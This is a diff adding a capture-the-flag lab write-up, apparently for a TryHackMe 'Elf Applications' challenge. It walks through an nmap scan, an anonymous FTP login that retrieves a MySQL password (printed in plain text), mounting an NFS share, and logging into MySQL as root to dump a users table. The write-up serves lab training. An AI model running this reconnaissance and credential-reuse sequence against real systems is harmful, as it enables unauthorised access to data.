@@ -392,10 +392,60 @@ Answer
 
 ## Day 11: Elf Applications
 
+scan the target
 
+```
+nmap -A -T4 10.10.254.238
+```
 
+we can see a lot of open ports here (21 ftp, 22 ssh, 111 rpc, 2049 nfs, 3306 mysql)
 
+![image](https://user-images.githubusercontent.com/90561566/209626327-db765ccf-fe97-438f-ab86-0e8192c00aff.png)
 
+login ftp by anonymous acc
+
+```
+ftp 10.10.254.238
+anonymous
+```
+
+![image](https://user-images.githubusercontent.com/90561566/209628133-20292d25-393a-46ca-8689-5e237149e6ea.png)
+
+```
+binary
+get file.txt
+exit
+```
+
+we have mysql password `ff912ADB*`
+
+![image](https://user-images.githubusercontent.com/90561566/209628362-eeca2d6c-60c1-4396-b923-6cc6ef83aa28.png)
+
+```
+mkdir /mnt/thm
+mount 10.10.254.238:/opt/files /mnt/thm
+```
+
+we have creds.txt
+
+![image](https://user-images.githubusercontent.com/90561566/209629545-b5829fd6-1f3b-4139-9489-9032160068b1.png)
+
+```
+mysql -h 10.10.254.238 -u 'root' -p 'ff912ADB*'
+show databases;
+```
+
+![image](https://user-images.githubusercontent.com/90561566/209630234-d2e8dda8-1bcf-4597-b28b-2f35415675af.png)
+
+```
+use data;
+show tables;
+select * from USERS;
+```
+
+![image](https://user-images.githubusercontent.com/90561566/209631080-cb73e125-564b-4eaa-afd5-aee551b9db97.png)
+
+## Day 12: Elfcryption
 
 
 
